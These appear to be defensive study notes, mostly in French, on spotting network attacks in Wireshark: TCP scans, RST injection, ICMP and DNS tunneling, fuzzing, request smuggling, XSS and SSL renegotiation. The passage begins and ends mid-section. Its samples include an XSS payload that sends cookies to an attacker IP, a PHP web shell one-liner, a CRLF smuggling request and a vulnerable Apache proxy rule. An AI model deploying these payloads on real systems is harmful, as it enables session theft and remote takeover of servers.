  * **Open Port**: No response from the system.
  * **Closed Port**: The system replies with an RST packet.

* **Detection**: NULL scans exploit the fact that some systems do not respond to packets with no flags set, while others will send an RST for closed ports.

#### 4. **ACK Scan**

* **Technique**: In an ACK scan, the attacker sends packets with the ACK flag set. This can be used to map out firewalls or filtering devices by determining whether the port is open or closed.

* **Response**:

  * **Open Port**: No response or an RST packet (depending on firewall configuration).
  * **Closed Port**: An RST packet response.

* **Detection**: The ACK scan can help the attacker determine which ports are filtered and which are open/closed, providing useful information for further attacks.

#### 5. **FIN Scan**

* **Technique**: All packets are sent with the **FIN flag** set. This is a highly unusual scan technique.

* **Response**:

  * **Open Port**: No response from the system.
  * **Closed Port**: The system replies with an RST packet.

* **Detection**: Like the NULL scan, the FIN scan relies on peculiar behavior from the target system, and is easily detectable if the attacker sends packets with the FIN flag in an unexpected context.

#### 6. **Xmas Tree Scan**

* **Technique**: The attacker sends packets with **all flags** set (SYN, FIN, URG, PSH, RST, and ACK). This scan is designed to confuse the target system or firewall.

* **Response**:

  * **Open Port**: No response or an RST packet (depending on firewall or system configuration).
  * **Closed Port**: An RST response.

* **Detection**: Xmas tree scans are easily identifiable because all the flags are set, which is highly unusual for normal network traffic.

---

### Summary of TCP Scan Responses

| **Scan Type**        | **Flags Used** | **Open Port Response** | **Closed Port Response** |
| -------------------- | -------------- | ---------------------- | ------------------------ |
| **SYN Scan**         | SYN            | SYN-ACK                | RST                      |
| **SYN Stealth Scan** | SYN            | SYN-ACK                | No Response / RST        |
| **NULL Scan**        | No Flags       | No Response            | RST                      |
| **ACK Scan**         | ACK            | No Response / RST      | RST                      |
| **FIN Scan**         | FIN            | No Response            | RST                      |
| **Xmas Tree Scan**   | All Flags      | No Response / RST      | RST                      |

---

### Conclusion

TCP scanning techniques, such as SYN, FIN, NULL, and Xmas Tree scans, all rely on manipulating specific flags to achieve reconnaissance while evading detection. By analyzing these abnormal TCP patterns—whether excessive flag use, unusual flag combinations, or multiple host and port targeting—security professionals can detect early signs of malicious scanning or probing. Identifying these patterns through tools like Wireshark is critical for preventing potential attacks that may follow.

```

## **TCP Connection Resets & Hijacking**

```jsx
### Attaques sur les Connexions TCP : Terminaison et Détournement de Connexion

Les connexions TCP, bien que robustes dans de nombreux contextes, présentent des vulnérabilités, notamment en ce qui concerne la protection contre l'interruption ou le détournement des connexions. Ces failles peuvent se manifester par des attaques de terminaison de connexion via des paquets **RST** ou par des techniques plus avancées de détournement de connexion.

#### Terminaison de Connexion TCP via Paquets RST

Une **attaque par injection de paquets RST** (ou terminaison de connexion TCP) vise à perturber un service réseau. Cette attaque se déroule selon les étapes suivantes :

* **Usurpation de Source** : L'attaquant usurpe l'adresse source pour la faire correspondre à celle de la machine cible.
* **Injection de Paquet RST** : L'attaquant crée un paquet TCP avec le drapeau RST pour forcer la terminaison de la connexion active.
* **Port de Destination Ciblé** : L'attaquant spécifie un port de destination actuellement utilisé par la machine cible.

##### Détection des Attaques TCP RST

Pour détecter une attaque par RST, vous pouvez chercher plusieurs indicateurs dans **Wireshark** ou d'autres outils de capture de paquets :

* **Volume Anormal de Paquets** : Une quantité anormale de paquets envoyés à un port unique peut être un signe d'attaque RST. Cela se manifeste généralement sous forme de paquets répétitifs avec le drapeau RST activé.
* **Discrépance des Adresses MAC** : Si des paquets avec une IP usurpée (par exemple, `192.168.10.4`) sont observés avec une adresse MAC inattendue, cela peut indiquer une activité malveillante. En effet, un paquet usurpé doit correspondre à l'adresse MAC de la machine cible, mais une incohérence suggère un attaquant tentant de perturber la connexion.

Notez que **l'usurpation d'adresse MAC** est possible, mais elle peut entraîner des incohérences, notamment en cas d'empoisonnement ARP.

---

#### Détournement de Connexion TCP

Les attaques plus sophistiquées incluent le **détournement de connexion TCP**, où l'attaquant prend le contrôle d'une session TCP active. Cette attaque implique plusieurs techniques complexes :

* **Prédiction des Numéros de Séquence** : L'attaquant prédit les numéros de séquence pour injecter des paquets au bon endroit dans la connexion cible, imitant ainsi le flux légitime de données.
* **Usurpation de Source** : Comme pour les attaques RST, l'attaquant usurpe l'adresse IP source pour imiter la machine cible.
* **Blocage des ACKs** : Pour maintenir la connexion détournée, l'attaquant bloque ou retarde les paquets **ACK** (Accusé de Réception) envoyés par la machine cible. Cela permet de maintenir un flux continu de données sans que la machine cible puisse rétablir le contrôle.

##### Indicateurs de Détournement de Connexion TCP

Plusieurs anomalies peuvent indiquer une tentative de détournement de connexion TCP :

* **Anomalies dans les Numéros de Séquence** : Des numéros de séquence incohérents ou inhabituels peuvent suggérer des tentatives de prédiction de séquence, ce qui est typique des attaques de détournement de connexion.
* **ACKs Bloqués ou Retardés** : Si les paquets ACK sont retardés ou absents, cela peut indiquer que l'attaquant tente de prendre le contrôle de la session en bloquant la confirmation des paquets envoyés.

Le **détournement de connexion TCP** est souvent couplé avec des techniques comme **l'empoisonnement ARP**, qui permet à l'attaquant de manipuler les adresses MAC dans le réseau, rendant le trafic plus difficile à tracer.

---

### Conclusion

Les attaques sur les connexions TCP, telles que l'injection de paquets RST et le détournement de connexions, exploitent des failles inhérentes au protocole TCP. La détection de ces attaques repose sur l'observation des anomalies dans les numéros de séquence, des paquets RST répétitifs, ainsi que des incohérences dans les adresses MAC et les paquets ACK. Pour se défendre contre ces attaques, il est essentiel de :

1. **Analyser attentivement les flux TCP** pour repérer les anomalies dans le trafic.
2. **Vérifier la configuration des pare-feu et des réseaux** pour détecter et bloquer les activités suspectes.
3. **Utiliser des protocoles sécurisés** comme **SSH** à la place de Telnet pour limiter les risques d'interception de connexion.

En surveillant activement ces indicateurs et en mettant en œuvre des contrôles de sécurité appropriés, il est possible de détecter et d'atténuer les attaques basées sur TCP avant qu'elles ne causent des dommages importants.

```

## **ICMP Tunneling**

```jsx

Le **tunneling** est une méthode utilisée par les attaquants pour exfiltrer des données d'un système vers un autre, souvent en exploitant des protocoles de confiance ou des proxies autorisés par les contrôles réseau.

#### Les Bases du Tunneling

Lorsqu'un attaquant a besoin d'envoyer des données vers un hôte externe, il peut utiliser le tunneling. Cela peut se faire en établissant une commande et un contrôle sur une machine compromise. Les attaquants utilisent divers protocoles pour le tunneling, notamment **SSH**, **HTTP**, **HTTPS**, **DNS** et **ICMP**, chacun permettant de contourner les mesures de sécurité réseau.

### ICMP Tunneling

L'**ICMP tunneling** consiste à insérer des données dans le champ de données des requêtes ICMP pour les dissimuler dans le trafic réseau normal. Comme ICMP est un protocole légitime utilisé pour la gestion des réseaux, il est souvent négligé par les mécanismes de sécurité, ce qui permet aux attaquants de contourner facilement les contrôles réseau.

### Détection de l'ICMP Tunneling

Le tunneling ICMP implique l'insertion de données dans le champ de données des requêtes ICMP, ce qui peut être détecté en examinant la taille des données dans les requêtes et réponses ICMP. Voici quelques méthodes pour identifier ce type d'attaque :

#### 1. **Filtrage ICMP avec Wireshark**

Utilisez le filtre ICMP dans Wireshark pour visualiser le trafic spécifique ICMP :

```
icmp
```

#### 2. **Détection de Transferts de Données Importants**

Le trafic ICMP fragmenté ou des champs de données exceptionnellement larges peuvent indiquer un tunneling. Les requêtes ICMP normales ont des champs de données relativement petits (environ 48 octets). Si la taille du champ de données dépasse 48 octets, cela pourrait signaler un transfert de données, souvent lié au tunneling. Les tailles de données peuvent parfois atteindre 38 000 octets dans des attaques avancées.

#### 3. **Inspection du Contenu des Données**

Dans Wireshark, vous pouvez inspecter le contenu des données dans les requêtes ICMP pour détecter des informations sensibles (comme des **identifiants**, des **mots de passe**, etc.). Cela peut être un signe direct de tunneling ICMP. Si les données semblent codées ou cryptées, elles nécessitent une attention particulière.

#### 4. **Décodage des Données Encodées**

Les attaquants peuvent encoder ou crypter les données exfiltrées dans les paquets ICMP pour éviter la détection. Dans ce cas, le décodage manuel des données encodées pourrait être nécessaire. Par exemple, si vous détectez une chaîne encodée en base64, vous pouvez utiliser la commande suivante pour la décoder :

```bash
echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
```

Cela renverra le texte décodé, qui pourrait contenir des informations sensibles exfiltrées.

#### 5. **Anomalies de Taille de Données ICMP**

Si les tailles de données ICMP dépassent les tailles typiques (environ 48 octets), cela nécessite une analyse plus approfondie. Un transfert de données excessif dans un paquet ICMP est souvent un indicateur clé de tunneling.

### Prévention du Tunneling ICMP

Voici quelques méthodes pour prévenir et limiter l'impact des attaques par **tunneling ICMP** :

1. **Bloquer les Requêtes ICMP**

   Désactiver les requêtes ICMP dans le réseau peut empêcher le tunneling ICMP, bien que cela puisse affecter les diagnostics de réseau légitimes. Cette approche empêche les attaquants d'utiliser ICMP comme vecteur pour le tunneling.

2. **Inspecter les Requêtes et Réponses ICMP**

   En surveillant et en analysant le trafic ICMP, surtout les champs de données, il est possible de détecter et d'atténuer les activités suspectes de tunneling. Les administrateurs réseau doivent être attentifs aux anomalies dans les tailles de données ICMP et aux tentatives de communication cachées.

### Conclusion

Le **tunneling ICMP** représente une méthode sophistiquée d'exfiltration de données. Cependant, avec une surveillance appropriée et l'utilisation d'outils comme **Wireshark**, il est possible de détecter des anomalies dans le trafic ICMP et de prendre des mesures pour protéger le réseau. Les efforts de prévention, comme la désactivation du ICMP ou l'inspection continue du trafic réseau, sont essentiels pour prévenir ce type de menace.

```

## **HTTP & HTTPs Service Enumeration**

```jsx

---

## 🚨 Détection et Prévention des Tentatives de Fuzzing sur les Serveurs Web

Les **modèles de trafic HTTP/HTTPS** inhabituels peuvent indiquer des attaques potentielles contre les serveurs web. Les attaquants exploitent souvent les vulnérabilités de la couche de transport pour collecter des informations, explorer ou exploiter les applications web. L'une de ces méthodes d'attaque est le **fuzzing**, qui consiste à envoyer des données aléatoires ou inattendues à un serveur pour découvrir des vulnérabilités.

### 🧩 Indicateurs des Tentatives de Fuzzing

Les signes courants des tentatives de fuzzing incluent :

* Un **trafic HTTP/HTTPS excessif** provenant d'un seul hôte, souvent avec des modèles de requêtes irréguliers.
* Des **tentatives d'accès répétitives ou inhabituelles** trouvées dans les journaux d'accès du serveur web, comme des requêtes pour des fichiers ou des répertoires inexistants.

### 🚀 Détection du Fuzzing de Répertoires

Le **fuzzing de répertoires** consiste à tester l'existence de pages web ou de répertoires vulnérables. Cela se fait généralement en envoyant de nombreuses requêtes HTTP pour différents chemins.

#### Filtre Wireshark pour le Fuzzing de Répertoires :

1. **Filtre de base** :

   * Filtrer le trafic HTTP : `http`
2. **Isoler les requêtes** :

   * Pour se concentrer uniquement sur les requêtes (excluant les réponses) : `http.request`

#### **Indicateurs du Fuzzing de Répertoires :**

* **Réponses 404 fréquentes**, ce qui indique des tentatives répétées d'accès à des fichiers ou répertoires inexistants.
* **Séquences de requêtes rapides**, où plusieurs requêtes sont envoyées dans une courte période.

#### Exemple :

Les journaux d'accès peuvent afficher des entrées comme celles-ci :

```
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /randomfile1 HTTP/1.1" 404 435 "-" "Mozilla/4.0"
192.168.10.5 - - [18/Jul/2023:12:58:07 -0600] "GET /.bash_history HTTP/1.1" 404 435 "-" "Mozilla/4.0"
```

---

### 🛠️ Analyser les Journaux du Serveur Web pour le Fuzzing

Pour détecter les tentatives de fuzzing sur votre serveur web, inspectez les journaux d'accès pour repérer une activité inhabituelle.

#### **Commandes pour Filtrer les Journaux par Adresse IP :**

* **Avec `grep`** :

  ```
  cat access.log | grep "192.168.10.5"
  ```

* **Avec `awk`** :

  ```
  cat access.log | awk '$1 == "192.168.10.5"'
  ```

Recherchez des accès rapides et répétitifs à des ressources non existantes (comme `.bash_history`, `.git`, ou des demandes de chemins inhabituels).

---

### 🛡️ Détecter d'Autres Techniques de Fuzzing

Les attaquants peuvent également cibler des éléments **dynamiques ou statiques** de la page web, comme des **champs ID**, ou tester des vulnérabilités de type **IDOR (Insecure Direct Object Reference)**. Ils peuvent utiliser des outils pour envoyer ces charges utiles, en particulier lors de l'analyse de **JSON**.

#### **Filtre Wireshark pour l'Analyse d'un Hôte Spécifique** :

Pour examiner le trafic provenant d'un hôte spécifique, appliquez le filtre suivant :

```
http.request and ((ip.src_host == <IP suspectée>) or (ip.dst_host == <IP suspectée>))
```

#### **Suivre les Flux HTTP** :

* Faites un clic droit sur n'importe quelle requête HTTP dans Wireshark et sélectionnez `Follow > HTTP Stream` pour voir la séquence complète des requêtes et réponses de cette session.

#### **Indicateurs du Fuzzing Avancé :**

* **Modèles de requêtes rapides**, surtout pour des ressources qui n'existent pas.
* **Attaques échelonnées ou distribuées**, où les requêtes sont étendues dans le temps ou réparties sur plusieurs adresses IP pour éviter la détection.

---

### 🛡️ Prévenir les Tentatives de Fuzzing

Pour se protéger contre les tentatives de fuzzing et réduire le risque d'exploitation réussie :

1. **Ajuster les Configurations du Serveur** :

   * Configurez votre serveur (par exemple, Apache ou Nginx) pour retourner les codes de réponse appropriés pour les ressources inexistantes.
   * Utilisez des pages d'erreur personnalisées qui ne révèlent pas d'informations sensibles sur la structure ou les fonctionnalités du serveur.

2. **Mettre en place des Règles de Web Application Firewall (WAF)** :

   * Les WAF peuvent bloquer des **IP spécifiques** ou des **modèles de comportement suspect**, comme des taux de requêtes inhabituels ou des tentatives répétées d'accès à des ressources inexistantes.

3. **Limiter le Taux de Requêtes** :

   * Implémentez des techniques de limitation du taux pour réduire l'efficacité des outils automatisés de fuzzing.

4. **Contrôle d'Accès** :

   * Assurez-vous que les répertoires ou fichiers sensibles sont correctement sécurisés ou cachés de l'accès public (par exemple, `.git`, `.bash_history`).

En surveillant activement ces modèles et en mettant en place des protections robustes, les serveurs web peuvent être mieux protégés contre les attaques par fuzzing.

---

```

## **Strange HTTP Headers**

```jsx
### Analyse du Trafic du Serveur Web et Détection des Activités Suspectes

Lorsque vous analysez le trafic d'un serveur web, l'absence de signes évidents comme le fuzzing ne garantit pas la sécurité. Une inspection plus approfondie, en particulier des en-têtes HTTP inhabituels, peut révéler une activité suspecte. Voici quelques anomalies courantes à surveiller :

#### En-têtes Host Anormaux

Les en-têtes **Host** manipulés ou inattendus sont souvent un signe d'attaque. Par exemple, un attaquant pourrait tenter de forcer un serveur à exécuter une requête vers une adresse ou un sous-domaine non autorisé, ou à contourner des restrictions de domaine.

##### Filtrage du Trafic HTTP

Commencez par limiter le trafic dans Wireshark pour observer uniquement les requêtes et réponses HTTP :

```bash
http
```

##### Isolation des En-têtes Host Irréguliers

Spécifiez l'adresse IP du serveur légitime pour exclure le trafic normal. Pour un serveur externe, remplacez par le nom de domaine :

```bash
http.request and (!(http.host == "192.168.10.7"))
```

##### Indicateurs de Manipulation des En-têtes Host

Examinez les résultats pour détecter des en-têtes **Host** suspects tels que `127.0.0.1` ou des noms d'hôte inhabituels comme `admin`. Les attaquants manipulent souvent ces en-têtes pour escalader les privilèges en utilisant des outils de proxy comme **Burp Suite**.

##### Mesures Préventives :

* Vérifiez les configurations **virtualhost** et d'accès pour empêcher un accès non autorisé.
* Gardez votre serveur web **mis à jour**.

---

#### Analyse des Erreurs 400 et Détection du Smuggling de Requêtes

Le code d'erreur **400 (Bad Request)** peut indiquer une activité suspecte et est utile pour identifier des actions HTTP malveillantes, notamment les attaques de **smuggling de requêtes** (injection CRLF).

##### Filtrage des Réponses de Code 400

Pour détecter les tentatives de **request smuggling**, filtrez les réponses avec le code 400 dans Wireshark :

```bash
http.response.code == 400
```

Suivez ces flux HTTP pour découvrir des tentatives de **CRLF Injection**, une forme de smuggling où un attaquant tente de contourner les contrôles de sécurité via des en-têtes HTTP malformés.

##### Exemple de Tentative de CRLF

Un attaquant pourrait construire une requête comme suit :

```text
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5
\r\n
GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080
\r\n
HTTP/1.1
Host: 192.168.10.5
```

Décodé par le serveur, cela donne deux requêtes distinctes :

```text
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
```

Si le serveur est vulnérable, les deux requêtes peuvent réussir, permettant un accès non autorisé.

##### Exemple de Configuration Apache Vulnérable

Certaines configurations Apache mal sécurisées peuvent laisser le serveur vulnérable à ce type d'attaque :

```apache
<VirtualHost *:80>
    RewriteEngine on
    RewriteRule "^/categories/(.*)" "http://192.168.10.100:8080/categories.php?id=$1" [P]
    ProxyPassReverse "/categories/" "http://192.168.10.100:8080/"
</VirtualHost>
```

Cette **mauvaise configuration** permet à l'attaquant de rediriger les requêtes vers un autre serveur sans restrictions, facilitant l'attaque de smuggling de requêtes.

---

#### Surveillance des Exploits Réussis

Pour détecter un exploit réussi, surveillez la présence d'un code **200 (Success)** en réponse à une requête suspecte. Une analyse régulière des réponses avec les codes **400** et **200** est essentielle pour identifier et atténuer les actions adverses dans le trafic HTTP.

En résumé, la détection des attaques de **manipulation des en-têtes Host** et de **request smuggling** repose sur une vigilance constante sur les erreurs HTTP, les anomalies dans les en-têtes et le suivi des codes de statut HTTP dans le trafic.

```

## **Cross-Site Scripting (XSS) & Code Injection Detection**

```jsx

---

## 🔎 Détection d'un comportement anormal dans le trafic HTTP

Un **volume inhabituel de requêtes HTTP vers un "serveur" interne inconnu** peut signaler une activité suspecte, notamment une **attaque de type Cross-Site Scripting (XSS)**. Ces requêtes peuvent servir à **exfiltrer des cookies ou des jetons de session**, même si les valeurs sont souvent encodées ou chiffrées en transit.

---

## 🐞 **Cross-Site Scripting (XSS)**

L’XSS survient lorsqu’un attaquant **injecte du code JavaScript malveillant** dans une page web via des champs d'entrée utilisateur. Ce code est ensuite **exécuté dans le navigateur des autres utilisateurs**, permettant à l’attaquant de voler des données sensibles comme les cookies ou tokens de session.

### 📦 Exemple de payload XSS :

```html
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>
```

➡️ **Ce que fait ce script :** il capture les cookies de l’utilisateur et les envoie silencieusement à une IP interne contrôlée par l’attaquant.

### ⚠️ Si ce type de code est détecté :

* Supprimez immédiatement le script injecté.
* Considérez la mise hors ligne temporaire du serveur concerné pour appliquer des correctifs de sécurité.

---

## 💥 **Injection de code (PHP, etc.)**

Des attaquants peuvent aussi exploiter des champs de saisie pour y insérer du **code exécutable** (comme PHP), afin d’obtenir un **accès à distance** ou de **prendre le contrôle du serveur**.

### 💻 Exemples typiques de code PHP malveillant :

```php
<?php system($_GET['cmd']); ?>
```

➡️ Permet à l’attaquant d’exécuter des commandes système à distance via l’URL.

```php
<?php echo `whoami`; ?>
```

➡️ Affiche l’utilisateur courant exécutant le serveur web.

### ⚠️ Si ce code est découvert :

* Supprimez-le immédiatement.
* Identifiez l'origine de l'injection et sécurisez la faille utilisée.

---

## 🛡️ **Mesures de prévention contre les attaques XSS et les injections de code**

### ✅ 1. **Sanitiser les entrées utilisateur** :

* Évitez tout contenu HTML/JS non filtré.
* Utilisez des fonctions comme `htmlspecialchars()` (PHP), `DOMPurify` (JS) ou des ORM sécurisés côté serveur.

### ✅ 2. **Ne jamais exécuter d'entrée utilisateur comme du code** :

* Aucune donnée envoyée par l'utilisateur ne doit être évaluée dynamiquement (`eval()`, `system()`, etc.).
* Préférez les appels paramétrés et les API sécurisées.

---

```

## **SSL Renegotiation Attacks**

```jsx
### Analyse du Trafic HTTPS et Détection des Attaques Basées sur SSL/TLS

Lors de l'analyse du trafic HTTPS, il est essentiel de comprendre les indicateurs du protocole HTTPS qui peuvent révéler des attaques basées sur SSL/TLS. HTTPS repose sur des protocoles de chiffrement, spécifiquement :

* **Transport Layer Security (TLS)**
* **Secure Sockets Layer (SSL)**

### Processus de Connexion HTTPS

1. **Handshake (Poignée de main)** : Le serveur et le client établissent une connexion, s'accordant sur les algorithmes de chiffrement et échangent des certificats.
2. **Chiffrement** : Après la poignée de main, la connexion est chiffrée avec l'algorithme sélectionné.
3. **Échange de Données** : Les données chiffrées (pages web, images, etc.) sont échangées entre le client et le serveur.
4. **Déchiffrement** : Les deux côtés déchiffrent les données à l'aide de leurs clés privées et publiques.

### Attaque de Renégociation SSL

Les **attaques de renégociation SSL** tentent de négocier des normes de chiffrement plus faibles ou d'exploiter les ressources du serveur, entraînant des vulnérabilités potentielles. Un autre exemple d'attaque liée au chiffrement HTTPS est la **vulnérabilité Heartbleed** (CVE-2014-0160).

### Processus de Handshake TLS et SSL

Pour sécuriser une connexion, un **handshake** TLS ou SSL est nécessaire, impliquant :

1. **Client Hello** : Le client envoie les versions TLS/SSL prises en charge, les suites de chiffrement et des données aléatoires.
2. **Server Hello** : Le serveur répond avec la version choisie, la suite de chiffrement et un nonce.
3. **Échange de Certificats** : Le serveur envoie son certificat contenant la clé publique.
4. **Échange de Clés** : Le client génère un **premaster secret**, le chiffre avec la clé publique du serveur, et l'envoie au serveur.
5. **Dérivation de la Clé de Session** : Les deux parties dérivent des clés de session à l'aide des nonces échangés et du **premaster secret**.
6. **Messages de Fin** : Les deux parties échangent des messages de fin, confirmant la réussite du handshake.
7. **Échange Sécurisé de Données** : La communication chiffrée commence.

### Détail Algorithmique du Handshake TLS

| Étape du Handshake                  | Calculs pertinents                                                                                                       |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **Client Hello**                    | ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }                                          |
| **Server Hello**                    | ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }                                            |
| **Échange de Certificat**           | ServerCertificate = { ServerPublicCertificate }                                                                          |
| **Échange de Clés**                 | ClientDHPublicKey = DH\_KeyGeneration(ClientDHPrivateKey) <br> ServerDHPublicKey = DH\_KeyGeneration(ServerDHPrivateKey) |
| **Premaster Secret**                | PremasterSecret = DH\_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)                                                |
| **Dérivation de la Clé de Session** | MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)                                          |
| **Extraction des Clés de Session**  | ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV                       |
| **Messages de Fin**                 | FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))                                         |

### Détection des Attaques de Renégociation SSL

* **Filtrer les Messages de Handshake** : Dans Wireshark, utilisez le filtre suivant pour voir uniquement les messages de handshake :

```bash
ssl.record.content_type == 22
```

#### Indicateurs des Attaques de Renégociation SSL :

* **Multiples Client Hellos** : Des messages Client Hello répétés d'un même client dans un court laps de temps signalent une attaque, car l'attaquant déclenche à plusieurs reprises la renégociation pour abaisser la suite de chiffrement.
* **Messages de Handshake Désordonnés** : Observer des messages Client Hello après la fin du handshake peut indiquer une manipulation ou une attaque.

### Raisons des Attaques de Renégociation SSL

* **Déni de Service** : Une renégociation excessive consomme des ressources serveur, rendant le serveur non réactif.
* **Exploitation de la Suite de Chiffrement** : Les attaquants peuvent tenter une renégociation pour exploiter des configurations de chiffrement faibles.
* **Cryptanalyse** : La renégociation peut faciliter la cryptanalyse en aidant les attaquants à analyser les modèles SSL/TLS, ce qui pourrait exposer des vulnérabilités.

```

## **Peculiar DNS Traffic**

```jsx
### Analyse du Trafic DNS

L’analyse du trafic DNS peut être complexe en raison de son volume élevé, mais il est essentiel d'identifier les anomalies pour détecter les activités malveillantes. Voici un aperçu du fonctionnement des requêtes DNS et des méthodes de détection d'activités suspectes.

#### Requêtes DNS

Les requêtes DNS permettent aux clients de résoudre des noms de domaine en adresses IP et vice versa.

##### Requêtes DNS Forward (Recherche Directe)

Dans une recherche directe (forward lookup), le client résout un nom de domaine en une adresse IP, suivant ces étapes :

1. **Initiation de la Requête** : Le client interroge un domaine, par exemple `academy.hackthebox.com`.
2. **Vérification du Cache Local** : Vérifie le cache DNS local ; si non résolu, continue.
3. **Requête Récursive** : Envoie la requête au serveur DNS configuré.
4. **Serveurs Racine** : Si nécessaire, le résolveur DNS interroge les serveurs racine.
5. **Serveurs TLD** : Le serveur racine dirige vers les serveurs TLD (par exemple, `.com`).
6. **Serveurs Autoritatifs** : Le serveur TLD oriente vers le serveur autoritatif du domaine.
7. **Serveurs Autoritatifs du Domaine** : Le résolveur obtient l’adresse IP.
8. **Réponse** : L'adresse IP est renvoyée au client.

##### Requêtes DNS Reverse (Recherche Inverse)

Les recherches inverses sont utilisées pour trouver un nom de domaine à partir d'une adresse IP :

1. **Initiation de la Requête** : Le client envoie une requête DNS inverse avec l’adresse IP.
2. **Zones de Recherche Inverse** : Le résolveur DNS vérifie s'il est autorisé.
3. **Requête pour le PTR** : Le résolveur recherche un enregistrement PTR.
4. **Réponse** : Le FQDN (Fully Qualified Domain Name) est retourné si un PTR correspondant est trouvé.

#### Types d'Enregistrements DNS

| Type d'Enregistrement | Description                                          |
| --------------------- | ---------------------------------------------------- |
| **A**                 | Associe un nom de domaine à une adresse IPv4         |
| **AAAA**              | Associe un nom de domaine à une adresse IPv6         |
| **CNAME**             | Crée un alias pour un domaine                        |
| **MX**                | Spécifie le serveur de messagerie pour le domaine    |
| **NS**                | Serveurs de noms autoritatifs pour le domaine        |
| **PTR**               | Utilisé pour les recherches inverses (IP -> Domaine) |
| **TXT**               | Spécifie du texte associé au domaine                 |
| **SOA**               | Informations administratives sur la zone             |

#### Détection des Tentatives d'énumération DNS

Un volume élevé de requêtes DNS provenant d'un seul hôte peut indiquer une **énumération DNS**. Pour détecter cela, vous pouvez filtrer le trafic DNS dans **Wireshark** en utilisant le filtre suivant :

```bash
dns
```

Si des requêtes incluent **ANY**, cela peut indiquer une énumération DNS, voire une énumération de sous-domaines.

#### Détection du Tunneling DNS

Le tunneling DNS peut impliquer un nombre important d'enregistrements **TXT** provenant d'un seul hôte. Les attaquants peuvent exfiltrer des données en les appendant dans le champ TXT des requêtes DNS.

##### Indicateurs de Tunneling DNS

Examinez le trafic DNS pour détecter des données inhabituelles ou inattendues dans le champ **TXT**. Les données peuvent être encodées ou chiffrées, souvent en **base64** :

* Exemple de données encodées en base64 :

```bash
echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
```

##### Gestion de l'Encodage Multiple

Certains attaquants peuvent encoder les données plusieurs fois ou les chiffrer, rendant leur détection plus difficile :

```bash
echo 'encoded_string' | base64 -d | base64 -d | base64 -d
```

##### Raisons du Tunneling DNS

* **Exfiltration de données** : Utilisé pour exporter de manière furtive des données d’un réseau.
* **Commandes et Contrôle** : Permet aux systèmes compromis de communiquer avec les serveurs contrôlés par l'attaquant, souvent utilisés dans les botnets.
* **Bypass de Pare-feu** : Les tunnels DNS peuvent contourner les pare-feu ou les proxys se concentrant sur les protocoles HTTP/HTTPS.
* **Domain Generation Algorithms (DGA)** : Les malwares avancés utilisent des algorithmes de génération de domaines (DGA) pour générer des noms de domaine dynamiques, compliquant ainsi la détection.

#### L'IPFS et le Tunneling DNS

Des acteurs de menaces avancées peuvent utiliser **IPFS** (Interplanetary File System) pour stocker et récupérer des fichiers malveillants. Cela rend le trafic DNS/HTTP vers des URI comme celles-ci particulièrement significatif :

* **Exemple d'URI IPFS** :

```text
https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz
```

IPFS fonctionne de manière décentralisée, ce qui complique sa détection. La surveillance régulière du trafic DNS et HTTP/HTTPS est essentielle pour atténuer ces attaques.

```

## **Strange Telnet & UDP Connections**

```jsx
### Analyse du Trafic Telnet et UDP : Détection des Activités Suspectes

Lors de l'analyse du trafic réseau, il est essentiel de prêter attention au **trafic Telnet** et au **trafic UDP**, qui peuvent parfois révéler des activités suspectes ou anormales qui pourraient autrement passer inaperçues.

#### Telnet

Le protocole **Telnet**, bien qu'étant obsolète en raison de ses préoccupations en matière de sécurité, est encore utilisé dans certains systèmes hérités (par exemple, les anciens systèmes Windows NT). Même si Telnet est largement remplacé par SSH pour la communication à distance sécurisée, il peut encore être utile de surveiller le trafic Telnet pour détecter d'éventuelles connexions suspectes ou abusives.

##### Détection du Trafic Telnet Traditionnel sur le Port 23

Le port **23** est le port par défaut pour **Telnet**. Lorsque vous observez du trafic sur ce port dans **Wireshark**, portez une attention particulière aux communications pour repérer tout signe d'abus. Bien que Telnet soit un protocole non crypté et facile à inspecter, les attaquants peuvent parfois chiffrer ou obfusquer les données dans le trafic Telnet. Il est donc nécessaire d'être vigilant et d'inspecter minutieusement les flux de données.

##### Trafic Telnet Non Reconnu sur des Ports Non Standards

Telnet peut fonctionner sur n'importe quel port, et les attaquants peuvent déplacer les communications Telnet vers des ports non standards pour masquer leurs activités malveillantes. Par exemple, des communications sur le **port 9999** peuvent indiquer une tentative de dissimulation. Dans ce cas, il est conseillé de suivre le flux TCP dans Wireshark pour examiner davantage.

##### Trafic Telnet via IPv6

Si du trafic Telnet via **IPv6** est détecté dans un réseau configuré en IPv4, cela pourrait indiquer un accès non autorisé. Pour filtrer spécifiquement le trafic Telnet sur IPv6 dans Wireshark, utilisez le filtre suivant :

```bash
((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
```

Ce filtre vous aide à isoler le trafic Telnet sur des adresses IPv6 spécifiques pour une inspection plus approfondie.

---

#### Surveillance des Communications UDP

Le **trafic UDP** est souvent utilisé par les attaquants pour contourner la surveillance basée sur TCP, en raison de la nature **sans connexion** et de la transmission rapide d'UDP. Cette caractéristique peut être avantageuse pour l'exfiltration de données furtives.

##### TCP vs UDP

